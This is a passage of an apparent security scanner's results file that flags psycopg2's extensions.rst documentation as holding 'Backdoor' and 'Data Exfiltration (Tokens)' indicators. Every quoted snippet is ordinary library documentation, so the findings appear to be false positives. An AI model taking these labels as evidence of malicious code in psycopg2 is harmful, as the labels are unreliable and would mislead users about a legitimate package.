                    "text": "\n        .. versionchanged:: 2.8\n            It was previously possible to obtain this value using a compiler\n            flag at builtin.\n\n    .. attribute:: internal_size\n\n",
                    "rendered": {
                      "text": "\n        .. versionchanged:: 2.8\n            It was previously possible to obtain this value using a compiler\n            flag at builtin.\n\n    .. attribute:: internal_size\n\n",
                      "markdown": "`\n        .. versionchanged:: 2.8\n            It was previously possible to obtain this value using a compiler\n            flag at builtin.\n\n    .. attribute:: internal_size\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 138,
                  "startColumn": 64,
                  "endLine": 138,
                  "endColumn": 68,
                  "snippet": {
                    "text": "    .. warning::\n\n        If Psycopg is built with |lo_truncate| support or with the 64 bits API\n        support (resp. from PostgreSQL versions 8.3 and 9.3) but at runtime an\n        older version of the dynamic library is found, the ``psycopg2`` module\n        will fail to import.  See :ref:`the lo_truncate FAQ <faq-lo_truncate>`\n        about the problem.\n",
                    "rendered": {
                      "text": "    .. warning::\n\n        If Psycopg is built with |lo_truncate| support or with the 64 bits API\n        support (resp. from PostgreSQL versions 8.3 and 9.3) but at runtime an\n        older version of the dynamic library is found, the ``psycopg2`` module\n        will fail to import.  See :ref:`the lo_truncate FAQ <faq-lo_truncate>`\n        about the problem.\n",
                      "markdown": "`    .. warning::\n\n        If Psycopg is built with |lo_truncate| support or with the 64 bits API\n        support (resp. from PostgreSQL versions 8.3 and 9.3) but at runtime an\n        older version of the dynamic library is found, the ``psycopg2`` module\n        will fail to import.  See :ref:`the lo_truncate FAQ <faq-lo_truncate>`\n        about the problem.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 961,
                  "startColumn": 9,
                  "endLine": 962,
                  "snippet": {
                    "text": "          INTEGER\n          INTERVAL\n          LONGINTEGER\n          TIME\n          UNICODE\n\n    Typecasters for basic types. Note that a few other ones (`~psycopg2.BINARY`,\n    `~psycopg2.DATETIME`, `~psycopg2.NUMBER`, `~psycopg2.ROWID`,\n",
                    "rendered": {
                      "text": "          INTEGER\n          INTERVAL\n          LONGINTEGER\n          TIME\n          UNICODE\n\n    Typecasters for basic types. Note that a few other ones (`~psycopg2.BINARY`,\n    `~psycopg2.DATETIME`, `~psycopg2.NUMBER`, `~psycopg2.ROWID`,\n",
                      "markdown": "`          INTEGER\n          INTERVAL\n          LONGINTEGER\n          TIME\n          UNICODE\n\n    Typecasters for basic types. Note that a few other ones (`~psycopg2.BINARY`,\n    `~psycopg2.DATETIME`, `~psycopg2.NUMBER`, `~psycopg2.ROWID`,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 869,
                  "startColumn": 17,
                  "endLine": 869,
                  "endColumn": 23,
                  "snippet": {
                    "text": "These values represent the possible status of a connection: the current value\ncan be read from the `~connection.status` attribute.\n\nIt is possible to find the connection in other status than the one shown below.\nThose are the only states in which a working connection is expected to be found\nduring the execution of regular Python client code: other states are for\ninternal usage and Python code should not rely on them.\n",
                    "rendered": {
                      "text": "These values represent the possible status of a connection: the current value\ncan be read from the `~connection.status` attribute.\n\nIt is possible to find the connection in other status than the one shown below.\nThose are the only states in which a working connection is expected to be found\nduring the execution of regular Python client code: other states are for\ninternal usage and Python code should not rely on them.\n",
                      "markdown": "`These values represent the possible status of a connection: the current value\ncan be read from the `~connection.status` attribute.\n\nIt is possible to find the connection in other status than the one shown below.\nThose are the only states in which a working connection is expected to be found\nduring the execution of regular Python client code: other states are for\ninternal usage and Python code should not rely on them.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 715,
                  "startColumn": 93,
                  "endLine": 715,
                  "endColumn": 101,
                  "snippet": {
                    "text": "\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORD\n\n\n\n",
                    "rendered": {
                      "text": "\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORD\n\n\n\n",
                      "markdown": "`\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORD\n\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 714,
                  "startColumn": 93,
                  "endLine": 714,
                  "endColumn": 101,
                  "snippet": {
                    "text": "    .. seealso:: PostgreSQL docs for the `password_encryption`__ setting, libpq `PQencryptPasswordConn()`__, `PQencryptPassword()`__ functions.\n\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORD\n\n\n",
                    "rendered": {
                      "text": "    .. seealso:: PostgreSQL docs for the `password_encryption`__ setting, libpq `PQencryptPasswordConn()`__, `PQencryptPassword()`__ functions.\n\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORD\n\n\n",
                      "markdown": "`    .. seealso:: PostgreSQL docs for the `password_encryption`__ setting, libpq `PQencryptPasswordConn()`__, `PQencryptPassword()`__ functions.\n\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORD\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 713,
                  "startColumn": 97,
                  "endLine": 713,
                  "endColumn": 105,
                  "snippet": {
                    "text": "\n    .. seealso:: PostgreSQL docs for the `password_encryption`__ setting, libpq `PQencryptPasswordConn()`__, `PQencryptPassword()`__ functions.\n\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORD\n\n",
                    "rendered": {
                      "text": "\n    .. seealso:: PostgreSQL docs for the `password_encryption`__ setting, libpq `PQencryptPasswordConn()`__, `PQencryptPassword()`__ functions.\n\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORD\n\n",
                      "markdown": "`\n    .. seealso:: PostgreSQL docs for the `password_encryption`__ setting, libpq `PQencryptPasswordConn()`__, `PQencryptPassword()`__ functions.\n\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORD\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 711,
                  "startColumn": 119,
                  "endLine": 711,
                  "endColumn": 127,
                  "snippet": {
                    "text": "\n    .. versionadded:: 2.8\n\n    .. seealso:: PostgreSQL docs for the `password_encryption`__ setting, libpq `PQencryptPasswordConn()`__, `PQencryptPassword()`__ functions.\n\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n",
                    "rendered": {
                      "text": "\n    .. versionadded:: 2.8\n\n    .. seealso:: PostgreSQL docs for the `password_encryption`__ setting, libpq `PQencryptPasswordConn()`__, `PQencryptPassword()`__ functions.\n\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n",
                      "markdown": "`\n    .. versionadded:: 2.8\n\n    .. seealso:: PostgreSQL docs for the `password_encryption`__ setting, libpq `PQencryptPasswordConn()`__, `PQencryptPassword()`__ functions.\n\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 711,
                  "startColumn": 90,
                  "endLine": 711,
                  "endColumn": 98,
                  "snippet": {
                    "text": "\n    .. versionadded:: 2.8\n\n    .. seealso:: PostgreSQL docs for the `password_encryption`__ setting, libpq `PQencryptPasswordConn()`__, `PQencryptPassword()`__ functions.\n\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n",
                    "rendered": {
                      "text": "\n    .. versionadded:: 2.8\n\n    .. seealso:: PostgreSQL docs for the `password_encryption`__ setting, libpq `PQencryptPasswordConn()`__, `PQencryptPassword()`__ functions.\n\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n",
                      "markdown": "`\n    .. versionadded:: 2.8\n\n    .. seealso:: PostgreSQL docs for the `password_encryption`__ setting, libpq `PQencryptPasswordConn()`__, `PQencryptPassword()`__ functions.\n\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 711,
                  "startColumn": 42,
                  "endLine": 711,
                  "endColumn": 50,
                  "snippet": {
                    "text": "\n    .. versionadded:: 2.8\n\n    .. seealso:: PostgreSQL docs for the `password_encryption`__ setting, libpq `PQencryptPasswordConn()`__, `PQencryptPassword()`__ functions.\n\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n",
                    "rendered": {
                      "text": "\n    .. versionadded:: 2.8\n\n    .. seealso:: PostgreSQL docs for the `password_encryption`__ setting, libpq `PQencryptPasswordConn()`__, `PQencryptPassword()`__ functions.\n\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n",
                      "markdown": "`\n    .. versionadded:: 2.8\n\n    .. seealso:: PostgreSQL docs for the `password_encryption`__ setting, libpq `PQencryptPasswordConn()`__, `PQencryptPassword()`__ functions.\n\n        .. __: https://www.postgresql.org/docs/current/static/runtime-config-connection.html#GUC-PASSWORD-ENCRYPTION\n        .. __: https://www.postgresql.org/docs/current/static/libpq-misc.html#LIBPQ-PQENCRYPTPASSWORDCONN\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 705,
                  "startColumn": 19,
                  "endLine": 705,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    .. __: https://www.postgresql.org/docs/current/static/encryption-options.html\n\n    Using `!None` as *algorithm* will result in querying the server to know the\n    current server password encryption setting, which is a blocking operation:\n    query the server separately and specify a value for *algorithm* if you\n    want to maintain a non-blocking behaviour.\n\n",
                    "rendered": {
                      "text": "    .. __: https://www.postgresql.org/docs/current/static/encryption-options.html\n\n    Using `!None` as *algorithm* will result in querying the server to know the\n    current server password encryption setting, which is a blocking operation:\n    query the server separately and specify a value for *algorithm* if you\n    want to maintain a non-blocking behaviour.\n\n",
                      "markdown": "`    .. __: https://www.postgresql.org/docs/current/static/encryption-options.html\n\n    Using `!None` as *algorithm* will result in querying the server to know the\n    current server password encryption setting, which is a blocking operation:\n    query the server separately and specify a value for *algorithm* if you\n    want to maintain a non-blocking behaviour.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 695,
                  "startColumn": 26,
                  "endLine": 695,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    :param scope: the scope to encrypt the password into; if *algorithm* is\n        ``md5`` it can be `!None`\n    :type scope: `connection` or `cursor`\n    :param algorithm: the password encryption algorithm to use\n\n    The *algorithm* ``md5`` is always supported. Other algorithms are only\n    supported if the client libpq version is at least 10 and may require a\n",
                    "rendered": {
                      "text": "    :param scope: the scope to encrypt the password into; if *algorithm* is\n        ``md5`` it can be `!None`\n    :type scope: `connection` or `cursor`\n    :param algorithm: the password encryption algorithm to use\n\n    The *algorithm* ``md5`` is always supported. Other algorithms are only\n    supported if the client libpq version is at least 10 and may require a\n",
                      "markdown": "`    :param scope: the scope to encrypt the password into; if *algorithm* is\n        ``md5`` it can be `!None`\n    :type scope: `connection` or `cursor`\n    :param algorithm: the password encryption algorithm to use\n\n    The *algorithm* ``md5`` is always supported. Other algorithms are only\n    supported if the client libpq version is at least 10 and may require a\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 692,
                  "startColumn": 43,
                  "endLine": 692,
                  "endColumn": 51,
                  "snippet": {
                    "text": "\n    :param password: the cleartext password to encrypt\n    :param user: the name of the user to use the password for\n    :param scope: the scope to encrypt the password into; if *algorithm* is\n        ``md5`` it can be `!None`\n    :type scope: `connection` or `cursor`\n    :param algorithm: the password encryption algorithm to use\n",
                    "rendered": {
                      "text": "\n    :param password: the cleartext password to encrypt\n    :param user: the name of the user to use the password for\n    :param scope: the scope to encrypt the password into; if *algorithm* is\n        ``md5`` it can be `!None`\n    :type scope: `connection` or `cursor`\n    :param algorithm: the password encryption algorithm to use\n",
                      "markdown": "`\n    :param password: the cleartext password to encrypt\n    :param user: the name of the user to use the password for\n    :param scope: the scope to encrypt the password into; if *algorithm* is\n        ``md5`` it can be `!None`\n    :type scope: `connection` or `cursor`\n    :param algorithm: the password encryption algorithm to use\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 691,
                  "startColumn": 49,
                  "endLine": 691,
                  "endColumn": 57,
                  "snippet": {
                    "text": "    Return the encrypted form of a PostgreSQL password.\n\n    :param password: the cleartext password to encrypt\n    :param user: the name of the user to use the password for\n    :param scope: the scope to encrypt the password into; if *algorithm* is\n        ``md5`` it can be `!None`\n    :type scope: `connection` or `cursor`\n",
                    "rendered": {
                      "text": "    Return the encrypted form of a PostgreSQL password.\n\n    :param password: the cleartext password to encrypt\n    :param user: the name of the user to use the password for\n    :param scope: the scope to encrypt the password into; if *algorithm* is\n        ``md5`` it can be `!None`\n    :type scope: `connection` or `cursor`\n",
                      "markdown": "`    Return the encrypted form of a PostgreSQL password.\n\n    :param password: the cleartext password to encrypt\n    :param user: the name of the user to use the password for\n    :param scope: the scope to encrypt the password into; if *algorithm* is\n        ``md5`` it can be `!None`\n    :type scope: `connection` or `cursor`\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 690,
                  "startColumn": 35,
                  "endLine": 690,
                  "endColumn": 43,
                  "snippet": {
                    "text": "\n    Return the encrypted form of a PostgreSQL password.\n\n    :param password: the cleartext password to encrypt\n    :param user: the name of the user to use the password for\n    :param scope: the scope to encrypt the password into; if *algorithm* is\n        ``md5`` it can be `!None`\n",
                    "rendered": {
                      "text": "\n    Return the encrypted form of a PostgreSQL password.\n\n    :param password: the cleartext password to encrypt\n    :param user: the name of the user to use the password for\n    :param scope: the scope to encrypt the password into; if *algorithm* is\n        ``md5`` it can be `!None`\n",
                      "markdown": "`\n    Return the encrypted form of a PostgreSQL password.\n\n    :param password: the cleartext password to encrypt\n    :param user: the name of the user to use the password for\n    :param scope: the scope to encrypt the password into; if *algorithm* is\n        ``md5`` it can be `!None`\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 690,
                  "startColumn": 11,
                  "endLine": 690,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\n    Return the encrypted form of a PostgreSQL password.\n\n    :param password: the cleartext password to encrypt\n    :param user: the name of the user to use the password for\n    :param scope: the scope to encrypt the password into; if *algorithm* is\n        ``md5`` it can be `!None`\n",
                    "rendered": {
                      "text": "\n    Return the encrypted form of a PostgreSQL password.\n\n    :param password: the cleartext password to encrypt\n    :param user: the name of the user to use the password for\n    :param scope: the scope to encrypt the password into; if *algorithm* is\n        ``md5`` it can be `!None`\n",
                      "markdown": "`\n    Return the encrypted form of a PostgreSQL password.\n\n    :param password: the cleartext password to encrypt\n    :param user: the name of the user to use the password for\n    :param scope: the scope to encrypt the password into; if *algorithm* is\n        ``md5`` it can be `!None`\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 688,
                  "startColumn": 46,
                  "endLine": 688,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\n.. method:: encrypt_password(password, user, scope=None, algorithm=None)\n\n    Return the encrypted form of a PostgreSQL password.\n\n    :param password: the cleartext password to encrypt\n    :param user: the name of the user to use the password for\n",
                    "rendered": {
                      "text": "\n.. method:: encrypt_password(password, user, scope=None, algorithm=None)\n\n    Return the encrypted form of a PostgreSQL password.\n\n    :param password: the cleartext password to encrypt\n    :param user: the name of the user to use the password for\n",
                      "markdown": "`\n.. method:: encrypt_password(password, user, scope=None, algorithm=None)\n\n    Return the encrypted form of a PostgreSQL password.\n\n    :param password: the cleartext password to encrypt\n    :param user: the name of the user to use the password for\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 686,
                  "startColumn": 29,
                  "endLine": 686,
                  "endColumn": 37,
                  "snippet": {
                    "text": "        .. __: https://www.postgresql.org/docs/current/static/libpq-exec.html#LIBPQ-PQESCAPEIDENTIFIER\n\n\n.. method:: encrypt_password(password, user, scope=None, algorithm=None)\n\n    Return the encrypted form of a PostgreSQL password.\n\n",
                    "rendered": {
                      "text": "        .. __: https://www.postgresql.org/docs/current/static/libpq-exec.html#LIBPQ-PQESCAPEIDENTIFIER\n\n\n.. method:: encrypt_password(password, user, scope=None, algorithm=None)\n\n    Return the encrypted form of a PostgreSQL password.\n\n",
                      "markdown": "`        .. __: https://www.postgresql.org/docs/current/static/libpq-exec.html#LIBPQ-PQESCAPEIDENTIFIER\n\n\n.. method:: encrypt_password(password, user, scope=None, algorithm=None)\n\n    Return the encrypted form of a PostgreSQL password.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 686,
                  "startColumn": 20,
                  "endLine": 686,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        .. __: https://www.postgresql.org/docs/current/static/libpq-exec.html#LIBPQ-PQESCAPEIDENTIFIER\n\n\n.. method:: encrypt_password(password, user, scope=None, algorithm=None)\n\n    Return the encrypted form of a PostgreSQL password.\n\n",
                    "rendered": {
                      "text": "        .. __: https://www.postgresql.org/docs/current/static/libpq-exec.html#LIBPQ-PQESCAPEIDENTIFIER\n\n\n.. method:: encrypt_password(password, user, scope=None, algorithm=None)\n\n    Return the encrypted form of a PostgreSQL password.\n\n",
                      "markdown": "`        .. __: https://www.postgresql.org/docs/current/static/libpq-exec.html#LIBPQ-PQESCAPEIDENTIFIER\n\n\n.. method:: encrypt_password(password, user, scope=None, algorithm=None)\n\n    Return the encrypted form of a PostgreSQL password.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 661,
                  "startColumn": 10,
                  "endLine": 661,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\n        >>> from psycopg2.extensions import parse_dsn\n        >>> parse_dsn('dbname=test user=postgres password=secret')\n        {'password': 'secret', 'user': 'postgres', 'dbname': 'test'}\n        >>> parse_dsn(\"postgresql://someone@example.com/somedb?connect_timeout=10\")\n        {'host': 'example.com', 'user': 'someone', 'dbname': 'somedb', 'connect_timeout': '10'}\n\n",
                    "rendered": {
                      "text": "\n        >>> from psycopg2.extensions import parse_dsn\n        >>> parse_dsn('dbname=test user=postgres password=secret')\n        {'password': 'secret', 'user': 'postgres', 'dbname': 'test'}\n        >>> parse_dsn(\"postgresql://someone@example.com/somedb?connect_timeout=10\")\n        {'host': 'example.com', 'user': 'someone', 'dbname': 'somedb', 'connect_timeout': '10'}\n\n",
